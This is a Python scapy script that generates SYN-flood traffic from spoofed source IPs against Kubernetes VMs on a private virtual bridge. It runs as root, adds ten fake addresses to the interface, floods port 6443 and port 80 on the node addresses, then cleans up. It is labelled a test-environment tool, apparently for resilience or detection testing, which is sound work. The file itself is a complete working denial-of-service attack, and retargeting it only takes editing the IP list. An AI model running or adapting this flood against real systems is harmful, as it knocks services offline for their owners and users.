#!/usr/bin/env python3
"""
Spoofed-IP attack traffic generator for virbr-k8s test environment.

Flow:
  1. Add 10 fake source IPs to virbr-k8s
  2. Send 1000 packets (SYN flood) to each K8s VM
  3. Remove the fake IPs
"""

import subprocess
import sys
import time
from scapy.all import IP, TCP, send, conf

# ── Configuration ────────────────────────────────────────────────────────────

IFACE         = "virbr-k8s"
BRIDGE_IP     = "192.168.100.1"

# 10 fake source IPs (.20–.29: above VM range .10–.14, below MetalLB range .200–.250)
FAKE_IPS = [f"192.168.100.{i}" for i in range(20, 30)]

# K8s VM targets: (name, ip, port)
TARGETS = [
    ("k8s-master", "192.168.100.10", 6443),
    ("k8s-node1",  "192.168.100.11", 80),
    ("k8s-node2",  "192.168.100.12", 80),
    ("k8s-node3",  "192.168.100.13", 80),
    ("k8s-node4",  "192.168.100.14", 80),
]

PACKETS_PER_TARGET = 25000  # overridden by --packets arg

# ── Helpers ──────────────────────────────────────────────────────────────────

def run(cmd: list[str], check=True):
    result = subprocess.run(cmd, capture_output=True, text=True)
    if check and result.returncode != 0:
        print(f"[WARN] {' '.join(cmd)}: {result.stderr.strip()}")
    return result

def add_fake_ips():
    print(f"[+] Adding {len(FAKE_IPS)} fake IPs to {IFACE}")
    for ip in FAKE_IPS:
        run(["ip", "addr", "add", f"{ip}/24", "dev", IFACE])
        print(f"    added {ip}")

def remove_fake_ips():
    print(f"\n[+] Removing {len(FAKE_IPS)} fake IPs from {IFACE}")
    for ip in FAKE_IPS:
        run(["ip", "addr", "del", f"{ip}/24", "dev", IFACE])
        print(f"    removed {ip}")

# ── Attack ───────────────────────────────────────────────────────────────────

def send_syn_flood(src_ip: str, dst_ip: str, dst_port: int, count: int):
    """Send TCP SYN packets from src_ip to dst_ip:dst_port."""
    conf.iface = IFACE
    pkt = IP(src=src_ip, dst=dst_ip) / TCP(dport=dst_port, flags="S", sport=12345)
    send(pkt, count=count, verbose=False, inter=0)

def run_attack():
    import random
    total = 0
    combos = [(ip, port, src) for _, ip, port in TARGETS for src in FAKE_IPS]
    for rnd in range(PACKETS_PER_TARGET):
        random.shuffle(combos)
        for dst_ip, dst_port, src in combos:
            send_syn_flood(src, dst_ip, dst_port, 1)
            total += 1
        if (rnd + 1) % 50 == 0:
            print(f"  round {rnd+1}/{PACKETS_PER_TARGET}  sent={total}", flush=True)
    print(f"\n[+] Total packets sent: {total}")

# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    import argparse
    global PACKETS_PER_TARGET
    p = argparse.ArgumentParser()
    p.add_argument("--packets", type=int, default=PACKETS_PER_TARGET,
                   help=f"每个目标发送的包数（默认 {PACKETS_PER_TARGET}）")
    args = p.parse_args()
    PACKETS_PER_TARGET = args.packets

    if subprocess.run(["id", "-u"], capture_output=True, text=True).stdout.strip() != "0":
        print("[ERROR] Must run as root (requires ip addr + raw socket).")
        sys.exit(1)

    add_fake_ips()
    time.sleep(0.5)  # let the kernel register the new addresses

    try:
        print(f"\n[+] Starting SYN flood — {PACKETS_PER_TARGET} pkts/target × {len(TARGETS)} targets\n")
        run_attack()
    finally:
        remove_fake_ips()
        print("\n[+] Cleanup complete.")

if __name__ == "__main__":
    main()
